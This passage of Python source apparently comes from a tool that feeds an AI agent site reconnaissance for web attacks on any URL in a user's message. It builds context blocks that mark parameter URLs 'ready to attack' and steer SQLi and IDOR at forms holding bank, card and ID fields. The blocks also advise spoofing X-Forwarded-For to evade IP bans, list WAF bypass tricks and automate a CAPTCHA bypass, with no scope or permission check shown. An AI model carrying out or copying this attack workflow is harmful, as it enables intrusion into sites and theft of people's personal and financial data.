            "scan", "스캔", "exploit", "익스", "웹취약", "web vuln",
            "리피터", "인트루더", "스캐너", "out-of-band",
        )
        text_lower = text.lower()
        has_kw = any(kw in text_lower for kw in _burp_kw)
        urls = _re.findall(r"https?://[^\s\"'<>]+", text)
        if not (has_kw and urls):
            return ""

        url = urls[0].rstrip("/?,")
        self.console.print(
            f"\n[{THEME['warn']}]{self.s.get('burp_auto_scan', '🔧 Burp 자동 스캔 중...')} {url}[/]"
        )
        try:
            from ..tools.burp_engine import full_scan
            result = full_scan(url)

            # ── [v3.2.53] 결과 요약 화면 출력 ─────────────────────────────
            _lines = result.splitlines()
            _findings = [l for l in _lines if l.strip().startswith("[HIGH]")
                         or l.strip().startswith("[MEDIUM]")
                         or l.strip().startswith("[LOW]")
                         or l.strip().startswith("[INFO]")]
            if _findings:
                self.console.print(
                    f"[{THEME['success']}]{self.s.get('burp_scan_done', '✅ Burp 스캔 완료')} "
                    f"({len(_findings)} {self.s.get('burp_findings', 'findings')})[/]"
                )
                for fl in _findings[:10]:           # 최대 10개만 출력
                    _sev = (
                        "error" if "[HIGH]"   in fl else
                        "warn"  if "[MEDIUM]" in fl else
                        "dim"
                    )
                    self.console.print(f"  [{THEME[_sev]}]{fl.strip()}[/]")
                if len(_findings) > 10:
                    self.console.print(
                        f"  [{THEME['dim']}]... +{len(_findings)-10} "
                        f"{self.s.get('burp_more', 'more findings (in AI context)')}[/]"
                    )
            else:
                self.console.print(
                    f"[{THEME['success']}]{self.s.get('burp_scan_done', '✅ Burp 스캔 완료')} — "
                    f"{self.s.get('burp_no_findings', 'no findings')}[/]"
                )
            return result
        except Exception as e:
            self.console.print(
                f"[{THEME['error']}]{self.s.get('burp_scan_error', '⚠️ Burp 스캔 오류')}: {e}[/]"
            )
            return ""

    def _auto_waf_scan(self, text: str) -> str:
        """URL 감지 시 사이트 raw 데이터 수집 → AI가 전략 전부 결정.
        고정 공격 지시 없음. AI가 수집된 데이터 기반으로 자율 판단.
        """
        import re
        urls = re.findall(r"https?://[^\s\"'<>]+", text)
        if not urls:
            return ""

        url = urls[0].rstrip("/?,")
        results: list[str] = []

        # 네트워크 환경 확인 및 표시
        _env = self._net_env
        _pub_ip = _env.get("public_ip", "")
        _vpn_on = _env.get("vpn_detected", False)
        _vpn_iface = _env.get("vpn_interface", "")
        _country = _env.get("country", "")

        _net_note = ""
        if _vpn_on and _pub_ip:
            _net_note = (
                f"[NETWORK_ENV]\n"
                f"  VPN: ACTIVE ({_vpn_iface})\n"
                f"  Exit IP (what target sees): {_pub_ip}\n"
                f"  Location: {_country}\n"
                f"  Use X-Forwarded-For: {_pub_ip} to appear as real source\n"
                f"  NOTE: Target blocks by exit IP, not local IP"
            )
            self.console.print(
                f"\n[{THEME['warn']}]  {self.s.get('vpn_detected_scan', '🔒 VPN detected: Exit IP [{ip}] ({country})').format(ip=_pub_ip, country=_country)}[/]"
            )
        elif _pub_ip:
            _net_note = (
                f"[NETWORK_ENV]\n"
                f"  VPN: NOT detected\n"
                f"  Public IP: {_pub_ip}\n"
                f"  Location: {_country}"
            )

        self.console.print(
            f"\n[{THEME['warn']}]{self.s.get('site_recon', '🔍 Site recon')}: {url}[/]"
        )

        try:
            import httpx as _hx, re as _re
            from urllib.parse import urlparse, urljoin

            _hdrs = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                              "AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            }

            # ── 1. 원본 URL 요청 (세션 쿠키 자동 수집) ─────────────────
            # follow_redirects=False 로 먼저 받아서 리다이렉트 패턴 분석
            resp_raw = _hx.get(url, headers=_hdrs, follow_redirects=False, timeout=12, verify=False)
            raw_status = resp_raw.status_code
            raw_location = resp_raw.headers.get("location", "")
            raw_cookies = dict(resp_raw.cookies)

            # 세션 쿠키 추출 (JSESSIONID, PHPSESSID 등)
            session_cookies: dict = {}
            for ck_name in ("JSESSIONID", "PHPSESSID", "ASP.NET_SessionId", "session", "sess"):
                if ck_name in raw_cookies:
                    session_cookies[ck_name] = raw_cookies[ck_name]
            # Set-Cookie 헤더에서도 추출
            for hdr_name, hdr_val in resp_raw.headers.items():
                if hdr_name.lower() == "set-cookie":
                    for ck_name in ("JSESSIONID", "PHPSESSID"):
                        if ck_name in hdr_val:
                            import re as _re2
                            m = _re2.search(rf"{ck_name}=([^;]+)", hdr_val)
                            if m:
                                session_cookies[ck_name] = m.group(1)

            # 세션 쿠키 포함해서 follow_redirects=True 재요청
            if session_cookies:
                _hdrs_with_session = {**_hdrs, "Cookie": "; ".join(f"{k}={v}" for k, v in session_cookies.items())}
            else:
                _hdrs_with_session = _hdrs

            resp = _hx.get(url, headers=_hdrs_with_session, follow_redirects=True, timeout=12, verify=False)
            page = _decode_response(resp)
            orig_status = resp.status_code
            parsed_url = urlparse(resp.url)
            base_domain = parsed_url.scheme + "://" + parsed_url.netloc

            # ── IP 차단 / 전체 307 리다이렉트 감지 ──────────────────
            ip_block_note = ""
            if raw_status in (307, 302, 301) and len(page) < 500:
                # 루트도 확인해서 정말 IP 차단인지 인증 요구인지 구분
                _root = base_domain + "/"
                try:
                    _root_resp = _hx.get(_root, headers=_hdrs, follow_redirects=False, timeout=8, verify=False)
                    _root_status = _root_resp.status_code
                    _root_location = _root_resp.headers.get("location", "")
                except Exception:
                    _root_status = 0
                    _root_location = ""

                if _root_status in (307, 302) and len(_root_resp.text) < 500:
                    # 루트도 307 → IP 차단 또는 전체 인증 필요
                    ip_block_note = (
                        f"[!!! CRITICAL WARNING !!!]\n"
                        f"ALL requests return {raw_status} redirect (length={len(page)}B).\n"
                        f"Root also returns {_root_status} → {_root_location}\n"
                        f"POSSIBLE CAUSES:\n"
                        f"  1. IP BLOCKED/RATE LIMITED — your IP has been banned\n"
                        f"  2. AUTHENTICATION REQUIRED — site requires login for all pages\n"
                        f"  3. GEO BLOCK — site blocks foreign IPs\n"
                        f"REQUIRED ACTIONS:\n"
                        f"  - If IP blocked: wait 5-10 min, try different User-Agent or X-Forwarded-For\n"
                        f"  - If auth required: find login endpoint, get valid session cookie first\n"
                        f"  - Try: /login, /signin, /cms/com/login.do, /member/login.do\n"
                        f"  - With JSESSIONID: {session_cookies if session_cookies else 'not obtained yet'}\n"
                        f"DO NOT keep testing injection on 307 responses — oracle is always invalid on redirects.\n"
                        f"GET A VALID SESSION FIRST, then retry injection with that session cookie."
                    )
                    _307_msg = {
                        "ko": "⛔ 전체 307 감지 — IP 차단 또는 인증 필요. AI에게 세션 먼저 확보 지시.",
                        "zh": "⛔ 全站307检测 — IP被封锁或需要认证。指示AI先获取会话。",
                        "en": "⛔ All 307 detected — IP block or auth required. Instruct AI to get session first.",
                    }.get(getattr(self.config, "lang", "en"), "⛔ All 307 — get session first.")
                    self.console.print(f"[{THEME['error']}]  {_307_msg}[/]")
                else:
                    # 특정 URL만 307 → 인증 필요
                    ip_block_note = (
                        f"[AUTH REDIRECT DETECTED]\n"
                        f"URL {url} returns {raw_status} → {raw_location}\n"
                        f"This specific URL requires authentication.\n"
                        f"Session cookies: {session_cookies if session_cookies else 'none'}\n"
                        f"ACTION: Find and use a public endpoint, or get session via login form first."
                    )

            # 404 감지 시 루트로 폴백 + 원래 파라미터 분석 정보 보존
            root_url = base_domain + "/"
            orig_param_info = ""
            if orig_status == 404 and url != root_url:
                from urllib.parse import parse_qs, urlparse as _up
                _p = _up(url)
                _params = parse_qs(_p.query)
                orig_param_info = (
                    f"[TARGET NOTE] Original URL {url} returned 404.\n"
                    f"Parameters found: {dict(_params)}\n"
                    f"Root URL {root_url} will be used for full site analysis.\n"
                    f"IMPORTANT: Test parameters from original URL on pages that return 200."
                )
                self.console.print(
                    f"[{THEME['warn']}]  {self.s.get('url_404_fallback', '⚠ {url} → 404').format(url=url, root=root_url)}[/]"
                )
                resp = _hx.get(root_url, headers=_hdrs, follow_redirects=True, timeout=12, verify=False)
                page = _decode_response(resp)
                parsed_url = urlparse(resp.url)
                base_domain = parsed_url.scheme + "://" + parsed_url.netloc

            # 헤더 전체
            all_headers = dict(resp.headers)
            results.append(
                f"=== HTTP_RESPONSE ===\n"
                f"url: {resp.url}\n"
                f"original_url: {url}\n"
                f"raw_status_before_redirect: {raw_status}\n"
                f"raw_redirect_location: {raw_location}\n"
                f"status: {resp.status_code}\n"
                f"headers: {all_headers}\n"
                f"content_length: {len(page)}"
                + (f"\n{orig_param_info}" if orig_param_info else "")
            )
            # IP 차단 / 307 전체 경고
            if ip_block_note:
                results.append(f"=== IP_BLOCK_OR_AUTH_REQUIRED ===\n{ip_block_note}")
            # 세션 쿠키 전달
            if session_cookies:
                results.append(
                    f"=== SESSION_COOKIES (use in all requests) ===\n"
                    + "\n".join(f"  {k}={v}" for k, v in session_cookies.items())
                    + "\n  IMPORTANT: Include these cookies in ALL injection requests"
                )
            # ── CMS/기술스택 명시 감지 (AI 환각 방지) ───────────────
            _page_low = page.lower()[:5000]
            _hdr_low = str(all_headers).lower()
            _detected_cms = "UNKNOWN"
            _detected_lang = "UNKNOWN"

            # Java 감지
            if "jsessionid" in _hdr_low or ".do" in url or "jsessionid" in _page_low:
                _detected_cms = "Java/Spring/Struts"
                _detected_lang = "Java"
            # PHP 감지
            elif "phpsessid" in _hdr_low or ".php" in url or "phpsessid" in _page_low:
                _detected_lang = "PHP"
                if "gnuboard" in _page_low or "bo_table" in _page_low or "/bbs/" in _page_low:
                    _detected_cms = "Gnuboard (PHP)"
                elif "xe_" in _page_low or "xpressengine" in _page_low or "/xe/" in _page_low:
                    _detected_cms = "XpressEngine/XE (PHP)"
                elif "godo" in _page_low:
                    _detected_cms = "Godo Mall (PHP)"
                elif "wordpress" in _page_low or "wp-content" in _page_low:
                    _detected_cms = "WordPress (PHP)"
                else:
                    _detected_cms = "PHP (CMS unknown)"
            # ASP/ASPX 감지
            elif ".asp" in url or "__viewstate" in _page_low or "asp.net" in _hdr_low:
                _detected_lang = "ASP.NET"
                _detected_cms = "ASP.NET"

            # ── SPA catch-all 라우터 감지 ─────────────────────────
            # 모든 경로가 같은 크기로 200 응답 → SPA/프론트엔드 라우터
            _page_size = len(page)
            _spa_catchall = False
            if resp.status_code == 200 and _page_size > 1000:
                try:
                    import random as _rand
                    _test_paths = [
                        f"/nonexistent_page_{_rand.randint(10000,99999)}",
                        f"/fakepath_abc123/xyz",
                    ]
                    _same_size_count = 0
                    for _tp in _test_paths:
                        _tr = _hx.get(base_domain + _tp, headers=_hdrs, timeout=4, verify=False)
                        if abs(len(_tr.text) - _page_size) < 200:
                            _same_size_count += 1
                    if _same_size_count >= 2:
                        _spa_catchall = True
                        results.insert(0,
                            f"=== ⚠ SPA_CATCHALL_ROUTER DETECTED ===\n"
                            f"  All paths return same size (~{_page_size}B)\n"
                            f"  → This is a SPA (React/Vue/Angular) with frontend routing\n"
                            f"  → Path enumeration is USELESS — all 200s are fake\n"
                            f"  → Strategy: analyze HTML/JS for API endpoints, not file paths\n"
                            f"  → Look for: fetch('/api/...'), axios.get('/v1/...), GraphQL endpoints\n"
                            f"  → DO NOT try /admin/, /login/, /wp-admin/ — they all 'exist'"
                        )
                        self.console.print(
                            f"[{THEME['warn']}]  {self.s.get('waf_spa_catch_all', '⚠ SPA catch-all router detected — path enumeration futile')}[/]"
                        )
                except Exception:
                    pass

            results.insert(0,
                f"=== ⚠ CONFIRMED_TECH_STACK (DO NOT ASSUME DIFFERENT) ===\n"
                f"  Language: {_detected_lang}\n"
                f"  CMS/Framework: {_detected_cms}\n"
                f"  {'CRITICAL: Java confirmed. NEVER use PHP paths (/bbs/board.php, bo_table, PHPSESSID etc.)' if _detected_lang == 'Java' else ''}\n"
                f"  {'CRITICAL: PHP/Gnuboard confirmed. NEVER use Java/.do endpoints.' if 'Gnuboard' in _detected_cms else ''}\n"
                f"  {'NOTE: Custom/unknown stack — no CMS detected. Analyze actual page structure only.' if _detected_cms == 'UNKNOWN' else ''}\n"
                f"\n"
                f"  ⚠ ANTI-ASSUMPTION RULE:\n"
                f"  If CMS=UNKNOWN → this may be a custom-built proprietary system.\n"
                f"  DO NOT guess or assume CMS/framework not confirmed above.\n"
                f"  Base attack strategy 100% on actual URLs, params, and responses found in recon.\n"
                f"  Never invent paths like /bbs/, /admin/, /wp-admin/ without seeing them in actual responses."
            )

            if _detected_lang == "Java":
                results.append(
                    f"=== JAVA_TARGET_NOTES ===\n"
                    f"  Java/Spring/Struts detected (JSESSIONID or .do endpoints)\n"
                    + "  JAVA INJECTION TIPS:\n"
                    + "  - .do endpoints: menu_id, seq, idx, code params are common injection points\n"
                    + "  - Session required: include JSESSIONID cookie in all requests\n"
                    + "  - Oracle DB likely: test with ROWNUM, dual table, ||concat\n"
                    + "  - Follow 307 redirects with cookies to reach actual content"
                )

            # ── 2. 기술 스택 힌트 (헤더 기반) ───────────────────────
            tech_hints = []
            h = str(all_headers).lower()
            p = page.lower()[:3000]
            for sig, name in [
                ("x-powered-by", all_headers.get("x-powered-by", "")),
                ("cf-ray", "Cloudflare" if "cf-ray" in h else ""),
                ("x-sucuri", "Sucuri WAF" if "x-sucuri" in h or "sucuri" in p else ""),
                ("x-fw-", "Wordfence" if "x-fw-" in h else ""),
                ("wordpress", "WordPress" if "wp-content" in p or "wp-json" in p else ""),
                ("drupal", "Drupal" if "drupal" in p else ""),
                ("joomla", "Joomla" if "joomla" in p else ""),
                ("laravel", "Laravel" if "laravel_session" in h or "laravel" in p else ""),
                ("django", "Django" if "csrfmiddlewaretoken" in p else ""),
                ("asp.net", "ASP.NET" if "asp.net" in h or "__viewstate" in p else ""),
            ]:
                if name:
                    tech_hints.append(name)
            if tech_hints:
                results.append(f"=== TECH_STACK ===\n{', '.join(t for t in tech_hints if t)}")

            # ── 3. 링크 수집 (정적 리소스 & 쓸모없는 파라미터 강화 필터) ──
            _STATIC_EXT = {".css",".js",".png",".jpg",".jpeg",".gif",".svg",
                           ".ico",".woff",".woff2",".ttf",".eot",".pdf",
                           ".zip",".mp4",".webm",".map",".scss",".less",
                           ".xml",".json",".txt",".csv"}
            # 버전/정적 파라미터 패턴 (ver=, v=, _=, t= 만 있는 URL은 제외)
            _STATIC_PARAM_RE = _re.compile(
                r"[?&](ver|version|v|_|t|ts|timestamp|rev|cache|cb)=[\w.\-]+$", _re.I
            )
            # CDN/외부 도메인 필터
            _CDN_DOMAINS = ("maxst.icons8", "cdnjs.", "fonts.google", "jquery.com",
                            "bootstrap", "googleapis.com", "gstatic.com", "cloudflare.com")

            def _is_useful_link(href: str, full: str) -> bool:
                # 외부 CDN 제외
                if any(cdn in full for cdn in _CDN_DOMAINS):
                    return False
                # 같은 도메인만 (서브도메인은 허용)
                parsed_full = urlparse(full)
                parsed_base = urlparse(base_domain)
                if parsed_full.netloc and parsed_base.netloc not in parsed_full.netloc and parsed_full.netloc not in parsed_base.netloc:
                    # 서브도메인 관계인지 확인
                    base_parts = parsed_base.netloc.split(".")
                    full_parts = parsed_full.netloc.split(".")
                    if base_parts[-2:] != full_parts[-2:]:  # 다른 도메인
                        return False
                # 정적 파일 확장자 제외
                path_only = full.split("?")[0]
                ext = "." + path_only.rsplit(".", 1)[-1].lower() if "." in path_only.split("/")[-1] else ""
                if ext in _STATIC_EXT:
                    return False
                # 버전 파라미터만 있는 링크 제외 (ver=3.3 같은것)
                if "?" in full and _STATIC_PARAM_RE.search(full.split("?", 1)[1]):
                    # 파라미터가 오직 버전용만인지 확인
                    qstr = full.split("?", 1)[1]
                    params = [p.split("=")[0] for p in qstr.split("&")]
                    static_params = {"ver","version","v","_","t","ts","timestamp","rev","cache","cb"}
                    if all(p.lower() in static_params for p in params):
                        return False
                return True

            all_links: list[str] = []
            for href in _re.findall(r'(?:href|action|src|data-url|data-href)=["\']([^"\'<>\s]+)["\']', page, _re.I):
                if href.startswith(("javascript:", "mailto:", "tel:", "#", "void")):
                    continue
                full = urljoin(str(resp.url), href)
                if _is_useful_link(href, full):
                    all_links.append(full)

            # JS 내부 경로 힌트 추출 (fetch('/api/...'), url: '/path')
            js_paths = _re.findall(r'["\'](\/([\w\-/]+\.do|api\/[\w\-/]+|[\w\-/]+\/(?:list|detail|view|search|index)[^\s"\']*?))["\']', page, _re.I)
            for jp, _ in js_paths[:20]:
                full = base_domain + jp
                if full not in all_links:
                    all_links.append(full)

            all_links = list(dict.fromkeys(all_links))

            param_links_raw = [l for l in all_links if "?" in l and "=" in l]
            no_param_links = [l for l in all_links if "?" not in l]

            # ── 3-1. Java .do 사이트: 세션 포함해서 2단계 깊은 크롤링 ──
            deep_links: list[str] = []
            _hdrs_sess = {**_hdrs_with_session}
            # .do 링크가 있거나 Java 감지된 경우
            _is_java = any(".do" in l for l in all_links) or bool(session_cookies)
            if _is_java and no_param_links:
                _visited = set()
                for _link in no_param_links[:8]:  # 최대 8개 페이지 방문
                    if _link in _visited:
                        continue
                    _visited.add(_link)
                    try:
                        _dr = _hx.get(_link, headers=_hdrs_sess, follow_redirects=True, timeout=6, verify=False)
                        if _dr.status_code == 200 and len(_dr.text) > 500:
                            for _dh in _re.findall(r'(?:href|action)=["\']([^"\'<>\s]+)["\']', _dr.text, _re.I):
                                if _dh.startswith(("javascript:", "mailto:", "tel:", "#")):
                                    continue
                                _df = urljoin(_link, _dh)
                                if _is_useful_link(_dh, _df) and _df not in all_links:
                                    deep_links.append(_df)
                    except Exception:
                        pass
                deep_links = list(dict.fromkeys(deep_links))
                # 깊은 크롤링에서 발견한 파라미터 URL 추가
                for dl in deep_links:
                    if dl not in all_links:
                        all_links.append(dl)
                        if "?" in dl and "=" in dl:
                            param_links_raw.append(dl)

            all_links = list(dict.fromkeys(all_links))[:60]
            param_links_raw = list(dict.fromkeys(param_links_raw))

            # ── 파라미터 URL 상태코드 검증 (세션 포함, 404는 제외) ───────
            param_links_verified: list[tuple[str, int]] = []
            param_links_404: list[str] = []
            param_links_redirect: list[tuple[str, int]] = []
            _custom_waf_detected: list[tuple[str, int, str]] = []  # (url, code, body_snippet)
            for pl in param_links_raw[:20]:
                try:
                    _vr = _hx.get(pl, headers=_hdrs_sess, follow_redirects=True, timeout=5, verify=False)
                    sc = _vr.status_code
                    _vr_body = _vr.text[:300]
                    # HTTP 999 / 비표준 코드 → 커스텀 WAF 감지
                    if sc not in range(100, 600):
                        _custom_waf_detected.append((pl, sc, _vr_body[:100]))
                    elif sc == 404:
                        param_links_404.append(pl)
                    elif sc in (301, 302, 307, 308):
                        param_links_redirect.append((pl, sc))
                    else:
                        # 정상 응답이어도 WAF 키워드 탐지
                        if any(w in _vr_body for w in ["No Hacking", "WebKnight", "Firewall Alert", "Security Alert"]):
                            _custom_waf_detected.append((pl, sc, _vr_body[:100]))
                        else:
                            param_links_verified.append((pl, sc))
                except Exception:
                    pass

            results.append(
                f"=== ALL_LINKS ({len(all_links)} total, {len(deep_links)} from deep crawl) ===\n"
                + "\n".join(f"  {l}" for l in all_links[:40])
            )
            if param_links_verified:
                results.append(
                    f"=== PARAM_URLS_VERIFIED ({len(param_links_verified)}) — ready to attack ===\n"
                    + "\n".join(f"  [{status}] {l}" for l, status in param_links_verified)
                )
            if param_links_redirect:
                results.append(
                    f"=== PARAM_URLS_REDIRECT ({len(param_links_redirect)}) — need session cookie ===\n"
                    + "\n".join(f"  [{status}] {l}" for l, status in param_links_redirect)
                    + "\n  TIP: Use session cookies to access these"
                )
            if param_links_404:
                results.append(
                    f"=== PARAM_URLS_404 ({len(param_links_404)}) — DO NOT ATTACK ===\n"
                    + "\n".join(f"  {l}" for l in param_links_404)
                )
            if _custom_waf_detected:
                results.append(
                    f"=== ⚠ CUSTOM_WAF_DETECTED ({len(_custom_waf_detected)}) ===\n"
                    + "\n".join(f"  [HTTP {sc}] {url}\n    → {snippet}" for url, sc, snippet in _custom_waf_detected)
                    + "\n  → Non-standard HTTP code = custom app-level WAF/filter\n"
                    + "  → Bypass strategy: encode payloads, use comment injection /**/, "
                    + "tab/newline whitespace, case mixing, chunked encoding"
                )
                self.console.print(
                    f"[{THEME['warn']}]  {self.s.get('waf_custom_detected', '⚠ Custom WAF detected (HTTP {codes})').format(codes=[sc for _, sc, _ in _custom_waf_detected])}[/]"
                )
            # 하위 호환용
            param_links = [l for l, _ in param_links_verified] + [l for l, _ in param_links_redirect]

            # ── 4. HTML 폼 전체 수집 ─────────────────────────────────
            forms_raw = _re.findall(
                r'<form[^>]*>(.*?)</form>', page, _re.DOTALL | _re.I
            )
            if forms_raw:
                form_summary = []
                # 민감 필드 키워드 (개인정보/금융)
                _SENSITIVE_FIELDS = {
                    "banknum": "은행계좌번호", "bankaccount": "은행계좌번호",
                    "blockcode": "주민등록번호/스팸코드", "ssn": "주민번호",
                    "jumin": "주민번호", "rrn": "주민번호",
                    "cardnum": "카드번호", "card_num": "카드번호",
                    "passwd": "비밀번호", "password": "비밀번호",
                    "pin": "PIN번호", "cvv": "CVV",
                }
                all_sensitive_found = []
                for fi, frm in enumerate(forms_raw[:8]):
                    action = (_re.search(r'action=["\']([^"\']+)["\']', frm, _re.I) or [None, ""])[1]
                    method = (_re.search(r'method=["\']([^"\']+)["\']', frm, _re.I) or [None, "GET"])[1]
                    inputs = _re.findall(r'<input[^>]+>', frm, _re.I)
                    input_names = [
                        (_re.search(r'name=["\']([^"\']+)["\']', inp, _re.I) or [None, "?"])[1]
                        for inp in inputs
                    ]
                    form_action_full = urljoin(str(resp.url), action) if action else str(resp.url)
                    form_summary.append(
                        f"  form[{fi}]: action={form_action_full} method={method.upper()} "
                        f"inputs={input_names}"
                    )
                    # 민감 필드 감지
                    for inp_name in input_names:
                        for key, label in _SENSITIVE_FIELDS.items():
                            if key in inp_name.lower():
                                all_sensitive_found.append(f"{inp_name}({label})")
                results.append(
                    f"=== HTML_FORMS ({len(forms_raw)}) ===\n" + "\n".join(form_summary)
                )
                # 민감 필드 발견 시 별도 경고
                if all_sensitive_found:
                    results.append(
                        f"=== ⚠ SENSITIVE_FORM_FIELDS DETECTED ===\n"
                        f"  Fields: {list(set(all_sensitive_found))}\n"
                        f"  → HIGH VALUE TARGET: This form collects PII/financial data\n"
                        f"  → Priority: SQLi on these fields, check for missing auth, IDOR on user data"
                    )
                    _sens_msg = {
                        "ko": f"⚠ 민감 필드 감지: {list(set(all_sensitive_found))}",
                        "zh": f"⚠ 检测到敏感字段: {list(set(all_sensitive_found))}",
                        "en": f"⚠ Sensitive fields detected: {list(set(all_sensitive_found))}",
                    }.get(getattr(self.config, "lang", "en"), f"⚠ Sensitive: {list(set(all_sensitive_found))}")
                    self.console.print(f"[{THEME['warn']}]  {_sens_msg}[/]")

            # ── 4b. CAPTCHA 분석 (파일명=정답 패턴 감지) ───────────────
            _captcha_imgs = _re.findall(
                r'<img[^>]+src=["\']([^"\']+(?:blockcode|captcha|spam|code|verify)[^"\']*\.(?:jpg|png|gif))["\']',
                page, _re.I
            )
            _enblockcode = _re.findall(
                r'name=["\']enblockcode["\'][^>]+value=["\']([a-f0-9]{32})["\']'
                r'|value=["\']([a-f0-9]{32})["\'][^>]*name=["\']enblockcode["\']',
                page, _re.I
            )
            if _captcha_imgs:
                import hashlib as _hl
                captcha_notes = []
                for img_src in _captcha_imgs:
                    # 파일명에서 코드 추출 (예: blockcode_uvaxsw.jpg → uvaxsw)
                    _m = _re.search(r'(?:blockcode|captcha|code)_([a-zA-Z0-9]+)\.', img_src)
                    if _m:
                        candidate = _m.group(1)
                        note = f"  CAPTCHA img: {img_src}\n  → Filename-encoded answer: '{candidate}'"
                        # enblockcode MD5 검증
                        for eh1, eh2 in _enblockcode:
                            eh = eh1 or eh2
                            if eh and _hl.md5(candidate.encode()).hexdigest() == eh:
                                note += f"\n  ✅ CONFIRMED: MD5('{candidate}') == enblockcode hash"
                                note += f"\n  → CAPTCHA BYPASS: submit blockcode={candidate} + enblockcode={eh}"
                        captcha_notes.append(note)
                if captcha_notes:
                    results.append(
                        f"=== ⚠ CAPTCHA_BYPASS_FOUND ===\n"
                        + "\n".join(captcha_notes)
                        + "\n  → The CAPTCHA answer is encoded in the image filename!\n"
                        + "  → Auto-bypass: read filename → extract answer → submit"
                    )
                    self.console.print(
                        f"[{THEME['warn']}]  {self.s.get('waf_captcha_bypass_detected', '⚠ Bypassable CAPTCHA detected! (filename=answer)')}[/]"
                    )

            # ── 5. API / JS 엔드포인트 힌트 ──────────────────────────
            api_hints = _re.findall(
                r'["\'](/(?:api|v\d|graphql|rest|ajax|json|data|auth|user|login|admin)[^"\'<>\s]*)["\']',
                page, _re.I
            )
            api_hints = list(dict.fromkeys(api_hints))[:20]
            if api_hints:
                results.append(
                    f"=== API_ENDPOINTS_HINT ({len(api_hints)}) ===\n"
                    + "\n".join(f"  {base_domain}{p}" for p in api_hints)
                )

            # ── 6. HTML 주석 (정보 누출 가능성) ─────────────────────
            comments = _re.findall(r'<!--(.*?)-->', page, _re.DOTALL)
            useful_comments = [c.strip() for c in comments if len(c.strip()) > 10][:5]
            if useful_comments:
                results.append(
                    "=== HTML_COMMENTS ===\n"
                    + "\n".join(f"  {c[:200]}" for c in useful_comments)
                )

            # ── 7. robots.txt / sitemap ───────────────────────────────
            for path in ["/robots.txt", "/sitemap.xml"]:
                try:
                    r2 = _hx.get(base_domain + path, headers=_hdrs, timeout=5, verify=False)
                    if r2.status_code == 200 and r2.text.strip():
                        results.append(
                            f"=== {path.strip('/')} ===\n{r2.text[:800]}"
                        )
                except Exception:
                    pass

            # 화면 표시 요약
            _recon_tpl = self.s.get(
                "recon_summary",
                "links={links}  forms={forms}  param_urls={params}  api={api}"
            )
            self.console.print(
                f"[{THEME['success']}]  "
                + _recon_tpl.format(
                    links=len(all_links),
                    forms=len(forms_raw),
                    params=len(param_links),
                    api=len(api_hints),
                ) + "[/]"
            )
            if tech_hints:
                self.console.print(
                    f"[{THEME['warn']}]  {self.s.get('recon_stack', 'tech stack')}: "
                    f"{', '.join(t for t in tech_hints if t)}[/]"
                )

        except Exception as e:
            results.append(f"RECON_ERROR: {e}")

        # ── Playwright 스마트 판단 ─────────────────────────────────────
        # 조건: 링크가 거의 없거나 JS SPA 감지 시 Playwright로 재정찰
        try:
            from ..tools import playwright_recon as _pw
            _pw_needed = _pw.needs_playwright(
                status=orig_status,
                body=page,
                url=url,
            )
            # 링크 너무 적거나 파라미터 URL이 0개인 경우 Playwright 시도
            if not _pw_needed and orig_status == 200 and len(all_links) < 3:
                _pw_needed = True
            # JS-rendered param_urls 미발견 시 Playwright로 보완
            if not _pw_needed and orig_status == 200 and len(param_links) == 0:
                _pw_needed = True

            if _pw_needed:
                _pw_lang = getattr(self.config, "lang", "en")
                _pw_msg = {
                    "ko": "🎭 JS 렌더링 감지 — Playwright로 재정찰 중...",
                    "zh": "🎭 检测到JS渲染 — 使用Playwright重新侦察...",
                    "en": "🎭 JS rendering detected — re-scanning with Playwright...",
                }.get(_pw_lang, "🎭 Playwright re-scan...")
                self.console.print(f"[{THEME['warn']}]  {_pw_msg}[/]")

                if not _pw.is_available():
                    _install_msg = {
                        "ko": "  Playwright 설치 중 (~150MB, 최초 1회)...",
                        "zh": "  正在安装Playwright (~150MB, 仅首次)...",
                        "en": "  Installing Playwright (~150MB, first time only)...",
                    }.get(_pw_lang, "  Installing Playwright...")
                    self.console.print(f"[{THEME['dim']}]{_install_msg}[/]")
                    _pw.install(self.console)

                if _pw.is_available():
                    _pw_result = _pw.recon(url, timeout_ms=20000)
                    _pw_text = _pw.format_result(_pw_result, base_url=url)
                    results.append(_pw_text)

                    # Playwright에서 찾은 파라미터 URL 추가
                    _pw_param_urls = _pw_result.get('param_urls', [])
                    if _pw_param_urls:
                        results.append(
                            f"=== PLAYWRIGHT_PARAM_URLS ({len(_pw_param_urls)}) — attack these ===\n"
                            + "\n".join(f"  {u}" for u in _pw_param_urls[:20])
                        )
                    # Playwright 쿠키 추가 (세션 포함)
                    _pw_cookies = _pw_result.get('cookies', {})
                    if _pw_cookies:
                        results.append(
                            f"=== PLAYWRIGHT_COOKIES (use in scripts) ===\n"
                            + "\n".join(f"  {k}={v}" for k, v in _pw_cookies.items())
                        )
        except Exception as _pw_err:
            pass  # Playwright 실패 시 무시하고 기존 결과 사용

        # 네트워크 환경 정보를 AI에게 전달 (VPN 여부, 실제 출구 IP)
        if _net_note:
            results.insert(0, _net_note)

        return "\n\n".join(results)

    @staticmethod
    def _estimate_context_tokens(text: str) -> int:
        """Cheap token estimate for local context budgeting."""
        return max(1, len(text or "") // 4)

    @staticmethod
    def _token_governor_enabled() -> bool:
        """Return whether model-input token governance is enabled."""
        import os as _tg_os

        return str(_tg_os.environ.get("BINGO_TOKEN_GOVERNOR", "1")).strip().lower() not in {
            "0", "false", "off", "no"
        }

    @staticmethod
    def _token_governor_int(name: str, default: int) -> int:
        """Read an integer Token Governor setting with a safe fallback."""
        import os as _tg_os

        try:
            return int(_tg_os.environ.get(name, str(default)) or default)
        except (TypeError, ValueError):
            return default

    @staticmethod
    def _html_context_digest(content: str) -> str:
        """Extract model-useful HTML facts without sending the whole page."""
        import re as _html_re

        if not content or not _html_re.search(r'<(?:html|form|input|script|a)\b', content, _html_re.I):
            return ""
        title = ""
        m_title = _html_re.search(r'<title[^>]*>(.*?)</title>', content, _html_re.I | _html_re.S)
        if m_title:
            title = _html_re.sub(r'\s+', ' ', m_title.group(1)).strip()[:160]
        status = ""
        m_status = _html_re.search(r'\bHTTP/(?:1\.1|2)\s+(\d{3})\b|STATUS[=:]\s*(\d{3})', content, _html_re.I)
        if m_status:
            status = next((g for g in m_status.groups() if g), "")
        forms = _html_re.findall(r'<form\b[^>]*>', content, _html_re.I)
        inputs = []
